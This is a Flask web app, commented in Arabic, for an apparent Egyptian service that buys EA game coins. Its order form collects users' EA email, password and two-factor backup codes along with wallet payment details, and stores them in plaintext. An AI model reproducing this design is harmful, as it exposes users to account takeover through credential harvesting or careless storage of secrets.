from flask import Flask, render_template, request, jsonify, session, redirect, url_for, flash
import os
import re
import hashlib
import secrets
import requests
from datetime import datetime
import json
import phonenumbers
from phonenumbers import geocoder, carrier
from phonenumbers.phonenumberutil import number_type
import time
import random
from urllib.parse import urlparse
from bs4 import BeautifulSoup
import numpy as np
import sqlite3
import threading
import psycopg2
from psycopg2.extras import RealDictCursor

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', secrets.token_urlsafe(32))

# إعدادات قاعدة البيانات PostgreSQL (نفس الكود الموجود)
def get_db_connection():
    """إنشاء اتصال بقاعدة البيانات PostgreSQL"""
    try:
        database_url = os.environ.get('DATABASE_URL')
        if not database_url:
            print("❌ DATABASE_URL غير موجود في متغيرات البيئة")
            return None
        
        if database_url.startswith('postgres://'):
            database_url = database_url.replace('postgres://', 'postgresql://', 1)
        
        conn = psycopg2.connect(database_url, cursor_factory=RealDictCursor)
        return conn
    except Exception as e:
        print(f"خطأ في الاتصال بقاعدة البيانات: {str(e)}")
        return None

def init_database():
    """تهيئة قاعدة البيانات وإنشاء الجداول (نفس الكود)"""
    try:
        conn = get_db_connection()
        if not conn:
            print("❌ فشل الاتصال بقاعدة البيانات")
            return False
        
        cursor = conn.cursor()
        
        # إنشاء جدول المستخدمين
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS users_profiles (
                id SERIAL PRIMARY KEY,
                user_id VARCHAR(50) UNIQUE NOT NULL,
                platform VARCHAR(20) NOT NULL,
                whatsapp_number VARCHAR(20) NOT NULL,
                whatsapp_info TEXT,
                payment_method VARCHAR(50) NOT NULL,
                payment_details TEXT,
                telegram_username VARCHAR(100),
                email_addresses TEXT,
                email_count INTEGER DEFAULT 0,
                telegram_linked BOOLEAN DEFAULT FALSE,
                telegram_chat_id BIGINT,
                telegram_username_actual VARCHAR(100),
                telegram_linked_at TIMESTAMP,
                ip_address VARCHAR(20),
                user_agent VARCHAR(20),
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        # إنشاء جدول طلبات الكوينز الجديد
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS coins_orders (
                id SERIAL PRIMARY KEY,
                transfer_type VARCHAR(20) NOT NULL,
                coins_amount INTEGER NOT NULL,
                ea_email VARCHAR(255) NOT NULL,
                ea_password VARCHAR(255) NOT NULL,
                backup_codes TEXT,
                payment_method VARCHAR(50) NOT NULL,
                payment_details TEXT,
                notes TEXT,
                base_price DECIMAL(10,2),
                transfer_fee DECIMAL(10,2),
                total_price DECIMAL(10,2),
                status VARCHAR(20) DEFAULT 'pending',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        # إنشاء جدول أكواد التليجرام
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS telegram_codes (
                id SERIAL PRIMARY KEY,
                code VARCHAR(100) UNIQUE NOT NULL,
                platform VARCHAR(20),
                whatsapp_number VARCHAR(20),
                payment_method VARCHAR(50),
                payment_details TEXT,
                telegram_username VARCHAR(100),
                used BOOLEAN DEFAULT FALSE,
                telegram_chat_id BIGINT,
                telegram_username_actual VARCHAR(100),
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                used_at TIMESTAMP
            )
        """)
        
        conn.commit()
        print("✅ تم إنشاء جميع الجداول بنجاح")
        return True
        
    except Exception as e:
        print(f"❌ خطأ في تهيئة قاعدة البيانات: {str(e)}")
        return False
    finally:
        if conn:
            conn.close()

# تهيئة قاعدة البيانات عند بدء التطبيق
init_database()

# تكوين Flask للعمل بدون جافا سكريبت
app.config['SESSION_COOKIE_SECURE'] = False
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'

# قاموس البلدان والشركات المصرية
EGYPTIAN_CARRIERS = {
    '010': {'name': 'فودافون مصر', 'carrier_en': 'Vodafone Egypt'},
    '011': {'name': 'اتصالات مصر', 'carrier_en': 'Etisalat Egypt'},
    '012': {'name': 'أورانج مصر', 'carrier_en': 'Orange Egypt'},
    '015': {'name': 'وي مصر', 'carrier_en': 'WE Egypt (Telecom Egypt)'}
}

def sanitize_input(text):
    """تنظيف المدخلات من الأكواد الضارة"""
    if not text:
        return ""
    text = re.sub(r'<[^>]+>', '', text)
    return text.strip()

def validate_egyptian_mobile(phone_input):
    """تحقق من الرقم المصري - 11 رقم فقط"""
    if not phone_input:
        return {'is_valid': False, 'error': 'يرجى إدخال رقم الهاتف'}
    
    clean_digits = re.sub(r'[^\d]', '', str(phone_input).strip())
    
    if len(clean_digits) != 11:
        return {'is_valid': False, 'error': f'يجب أن يكون 11 رقماً بالضبط (تم إدخال {len(clean_digits)} رقم)'}
    
    if not clean_digits.startswith('01'):
        return {'is_valid': False, 'error': 'يجب أن يبدأ الرقم بـ 01 (رقم مصري)'}
    
    carrier_code = clean_digits[:3]
    if carrier_code not in ['010', '011', '012', '015']:
        return {'is_valid': False, 'error': f'كود الشركة {carrier_code} غير صحيح - يجب أن يكون 010/011/012/015'}
    
    carrier_info = EGYPTIAN_CARRIERS.get(carrier_code, {'name': 'غير معروف', 'carrier_en': 'Unknown'})
    
    return {
        'is_valid': True,
        'clean_number': clean_digits,
        'formatted_number': f"+2{clean_digits}",
        'display_number': f"0{clean_digits[1:3]} {clean_digits[3:6]} {clean_digits[6:]}",
        'carrier_code': carrier_code,
        'carrier_name': carrier_info['name'],
        'message': f'✅ رقم {carrier_info["name"]} صحيح'
    }

@app.before_request
def before_request():
    """تهيئة الجلسة"""
    if 'csrf_token' not in session:
        session['csrf_token'] = secrets.token_urlsafe(32)
        session.permanent = True

@app.route('/')
def index():
    """الصفحة الرئيسية"""
    # مسح الرسائل من الجلسة بعد العرض
    success_message = session.pop('success_message', None)
    error_message = session.pop('error_message', None)
    validation_errors = session.pop('validation_errors', {})
    form_data = session.pop('form_data', {})
    
    return render_template('index.html', 
                         success_message=success_message,
                         error_message=error_message,
                         validation_errors=validation_errors,
                         form_data=form_data)

@app.route('/update-profile', methods=['POST'])
def update_profile():
    """تحديث الملف الشخصي - بدون جافا سكريبت"""
    try:
        # جمع البيانات من الفورم
        platform = sanitize_input(request.form.get('platform'))
        whatsapp_number = sanitize_input(request.form.get('whatsapp_number'))
        payment_method = sanitize_input(request.form.get('payment_method'))
        payment_details = sanitize_input(request.form.get('payment_details', ''))
        
        # تجميع الأخطاء
        validation_errors = {}
        
        # التحقق من البيانات الأساسية
        if not platform:
            validation_errors['platform'] = 'يرجى اختيار المنصة'
            
        if not whatsapp_number:
            validation_errors['whatsapp_number'] = 'يرجى إدخال رقم الواتساب'
        else:
            # التحقق من صحة رقم الواتساب
            whatsapp_validation = validate_egyptian_mobile(whatsapp_number)
            if not whatsapp_validation['is_valid']:
                validation_errors['whatsapp_number'] = whatsapp_validation['error']
            else:
                whatsapp_number = whatsapp_validation['formatted_number']
                
        if not payment_method:
            validation_errors['payment_method'] = 'يرجى اختيار طريقة الدفع'
            
        # التحقق من تفاصيل الدفع حسب النوع
        if payment_method and not payment_details:
            if payment_method in ['vodafone_cash', 'etisalat_cash', 'orange_cash', 'we_cash']:
                validation_errors['payment_details'] = 'يرجى إدخال رقم المحفظة'
            elif payment_method == 'tilda':
                validation_errors['payment_details'] = 'يرجى إدخال رقم كارت تيلدا'
            elif payment_method == 'instapay':
                validation_errors['payment_details'] = 'يرجى إدخال رابط إنستا باي'
        
        # إذا وجدت أخطاء، أرجعها للصفحة
        if validation_errors:
            # حفظ البيانات المدخلة لإعادة عرضها
            session['validation_errors'] = validation_errors
            session['form_data'] = {
                'platform': platform,
                'whatsapp_number': request.form.get('whatsapp_number'),  # الرقم الأصلي
                'payment_method': payment_method,
                'payment_details': payment_details
            }
            return redirect(url_for('index'))
        
        # حفظ البيانات في قاعدة البيانات
        conn = get_db_connection()
        if conn:
            try:
                cursor = conn.cursor()
                user_id = hashlib.md5(f"{whatsapp_number}-{datetime.now().isoformat()}".encode()).hexdigest()[:12]
                
                cursor.execute("""
                    INSERT INTO users_profiles 
                    (user_id, platform, whatsapp_number, payment_method, payment_details, created_at)
                    VALUES (%s, %s, %s, %s, %s, NOW())
                """, (user_id, platform, whatsapp_number, payment_method, payment_details))
                
                conn.commit()
                print(f"✅ تم حفظ البيانات - User: {user_id}")
                
                # رسالة نجاح
                session['success_message'] = '✅ تم حفظ بياناتك بنجاح!'
                
                # الانتقال لصفحة الكوينز مباشرة
                return redirect(url_for('coins_order'))
                
            except Exception as e:
                print(f"خطأ في الحفظ: {str(e)}")
                session['error_message'] = 'حدث خطأ أثناء حفظ البيانات'
                return redirect(url_for('index'))
            finally:
                conn.close()
        else:
            session['error_message'] = 'خطأ في الاتصال بقاعدة البيانات'
            return redirect(url_for('index'))
        
    except Exception as e:
        print(f"خطأ في update_profile: {str(e)}")
        session['error_message'] = 'حدث خطأ غير متوقع'
        return redirect(url_for('index'))

@app.route('/coins-order')
def coins_order():
    """صفحة طلب بيع الكوينز"""
    success_message = session.pop('success_message', None)
    error_message = session.pop('error_message', None)
    validation_errors = session.pop('coin_validation_errors', {})
    form_data = session.pop('coin_form_data', {})
    
    return render_template('coins_order.html',
                         success_message=success_message,
                         error_message=error_message,
                         validation_errors=validation_errors,
                         form_data=form_data)

@app.route('/submit-coins-order', methods=['POST'])
def submit_coins_order():
    """معالجة طلب بيع الكوينز - بدون جافا سكريبت"""
    try:
        # جمع البيانات
        transfer_type = request.form.get('transfer_type')
        coins_amount = request.form.get('coins_amount')
        ea_email = request.form.get('ea_email')
        ea_password = request.form.get('ea_password')
        
        # جمع أكواد النسخ الاحتياطي
        backup_codes = []
        for i in range(1, 7):
            code = request.form.get(f'backup_code_{i}')
            if code and code.strip():
                backup_codes.append(code.strip())
        
        payment_method = request.form.get('payment_method')
        mobile_number = request.form.get('mobile_number')
        card_number = request.form.get('card_number') 
        payment_link = request.form.get('payment_link')
        notes = request.form.get('notes', '')
        
        # التحقق من البيانات
        validation_errors = {}
        
        if not transfer_type:
            validation_errors['transfer_type'] = 'يرجى اختيار نوع التحويل'
            
        if not coins_amount or int(coins_amount or 0) < 300:
            validation_errors['coins_amount'] = 'يرجى إدخال كمية كوينز صحيحة (300 أو أكثر)'
            
        if not ea_email:
            validation_errors['ea_email'] = 'يرجى إدخال البريد الإلكتروني'
            
        if not ea_password:
            validation_errors['ea_password'] = 'يرجى إدخال كلمة المرور'
            
        if not payment_method:
            validation_errors['payment_method'] = 'يرجى اختيار طريقة الدفع'
        else:
            # التحقق من تفاصيل الدفع
            if payment_method in ['فودافون كاش', 'اتصالات كاش', 'أورانج كاش', 'وي كاش'] and not mobile_number:
                validation_errors['mobile_number'] = 'يرجى إدخال رقم الهاتف'
            elif payment_method == 'كارت تيلدا' and not card_number:
                validation_errors['card_number'] = 'يرجى إدخال رقم البطاقة'
            elif payment_method == 'إنستا باي' and not payment_link:
                validation_errors['payment_link'] = 'يرجى إدخال رابط إنستا باي'
        
        # إذا وجدت أخطاء
        if validation_errors:
            session['coin_validation_errors'] = validation_errors
            session['coin_form_data'] = request.form.to_dict()
            return redirect(url_for('coins_order'))
        
        # معالجة تفاصيل الدفع
        payment_details = {}
        if mobile_number:
            payment_details['mobile_number'] = mobile_number
        elif card_number:
            payment_details['card_number'] = card_number
        elif payment_link:
            payment_details['payment_link'] = payment_link
        
        # حساب السعر
        coins_amount_int = int(coins_amount)
        base_price = coins_amount_int * 0.02
        
        if transfer_type == 'instant':
            total_price = base_price * 0.85
            transfer_fee = base_price * 0.15
        else:
            total_price = base_price
            transfer_fee = 0
        
        # حفظ في قاعدة البيانات
        conn = get_db_connection()
        if conn:
            try:
                cursor = conn.cursor()
                cursor.execute("""
                    INSERT INTO coins_orders 
                    (transfer_type, coins_amount, ea_email, ea_password, backup_codes, 
                     payment_method, payment_details, notes, base_price, transfer_fee, total_price, created_at)
                    VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, NOW())
                """, (
                    transfer_type, coins_amount_int, ea_email, ea_password, 
                    json.dumps(backup_codes), payment_method, json.dumps(payment_details),
                    notes, base_price, transfer_fee, total_price
                ))
                
                conn.commit()
                
                session['success_message'] = f'✅ تم إرسال طلب بيع الكوينز بنجاح! المبلغ المستحق: {total_price:.2f} جنيه'
                return redirect(url_for('coins_order'))
                
            except Exception as e:
                print(f"خطأ في طلب الكوينز: {str(e)}")
                session['error_message'] = 'حدث خطأ أثناء حفظ الطلب'
                return redirect(url_for('coins_order'))
            finally:
                conn.close()
        else:
            session['error_message'] = 'خطأ في الاتصال بقاعدة البيانات'
            return redirect(url_for('coins_order'))
        
    except Exception as e:
        print(f"خطأ في submit_coins_order: {str(e)}")
        session['error_message'] = 'حدث خطأ غير متوقع'
        return redirect(url_for('coins_order'))

# معالجة الأخطاء
@app.errorhandler(404)
def not_found(error):
    return render_template('index.html'), 404

@app.errorhandler(500)
def internal_error(error):
    return render_template('index.html'), 500

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port, debug=False)
